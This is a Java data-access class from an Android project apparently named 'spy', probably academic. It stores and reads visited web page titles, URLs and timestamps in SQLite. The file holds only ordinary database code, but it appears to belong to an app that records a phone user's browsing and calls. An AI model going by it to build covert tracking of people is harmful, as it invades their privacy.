package edu.uj.jkordas.spy.DAO;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;

import edu.uj.jkordas.spy.DatabaseOpenHelper;
import edu.uj.jkordas.spy.POJO.VisitedPage;
import edu.uj.jkordas.spy.dbtables.BrowserHistoryTable;
import edu.uj.jkordas.spy.dbtables.CallTable;
import edu.uj.jkordas.spy.developer.Logger;


public class BrowserHistoryDataSource {

	private Context context;
	private SQLiteDatabase database;
	private DatabaseOpenHelper dbHelper;
	private String[] allColumns = { BrowserHistoryTable.COLUMN_ID,
			BrowserHistoryTable.COLUMN_TITLE, BrowserHistoryTable.COLUMN_URL,
			BrowserHistoryTable.COLUMN_TIMESTAMP };

	public BrowserHistoryDataSource(Context context) {
		this.context = context;
		dbHelper = new DatabaseOpenHelper(context);
	}

	public void open() throws SQLException {
		database = dbHelper.getWritableDatabase();
	}

	public void close() {
		dbHelper.close();
	}

	public void addVisitedPage(String title, String url) {
		Date date = new java.util.Date();
		long timestamp = date.getTime();

		ContentValues values = new ContentValues();
		values.put(BrowserHistoryTable.COLUMN_TITLE, title);
		values.put(BrowserHistoryTable.COLUMN_URL, url);
		values.put(CallTable.COLUMN_TIMESTAMP, String.valueOf(timestamp));
		database.insert(BrowserHistoryTable.TABLE_BROWSER_HISTORY, null, values);
		Logger.log(this.context, "visited page saved to database");
	}

	public void clearTable() {
		database.execSQL("delete from " + BrowserHistoryTable.TABLE_BROWSER_HISTORY);
		Logger.log(this.context, "browser history table cleared");
	}

	public List<VisitedPage> getAllVisitedPages() {
		List<VisitedPage> visitedPagesList = new ArrayList<VisitedPage>();

		Cursor cursor = database.query(BrowserHistoryTable.TABLE_BROWSER_HISTORY, allColumns, null,
				null, null, null, null);

		cursor.moveToFirst();
		while (!cursor.isAfterLast()) {
			VisitedPage visitedPage = cursorToVisitedPage(cursor);
			visitedPagesList.add(visitedPage);
			cursor.moveToNext();
		}
		// make sure to close the cursor
		cursor.close();
		return visitedPagesList;
	}

	private VisitedPage cursorToVisitedPage(Cursor cursor) {
		String title = cursor.getString(1);
		String url = cursor.getString(2);
		VisitedPage visitedPage = new VisitedPage(title, url);
		visitedPage.setId(cursor.getLong(0));
		return visitedPage;
	}
}
